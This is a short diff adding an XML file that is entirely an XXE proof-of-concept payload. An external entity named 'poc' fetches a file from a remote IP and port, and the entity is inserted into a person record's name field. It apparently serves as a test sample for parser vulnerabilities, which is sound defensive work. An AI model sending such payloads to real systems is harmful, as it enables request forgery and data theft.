@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ANY[
+        <!ENTITY poc SYSTEM  "http://111.222.111.222:12345/test.txt">]>
+<person>
+    <age>10</age>
+    <name>&poc;</name>
+</person>
